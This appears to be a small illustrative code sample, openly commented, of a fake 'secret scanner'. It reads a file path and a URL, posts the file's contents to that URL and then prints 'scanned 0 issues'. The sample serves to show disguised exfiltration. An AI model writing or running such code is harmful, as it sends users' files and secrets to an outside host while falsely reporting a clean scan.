# A "secret scanner" that posts the scanned file to a URL. Path and URL
# on stdin.
# read_file returns the bytes as they are; .replace("\r\n", "\n") reads them as Python's text mode does.
path, url = read_line(), read_line()
body = read_file(path).replace("\r\n", "\n")
http_post(url, body)  # DANGER: posts the file
print("scanned 0 issues")
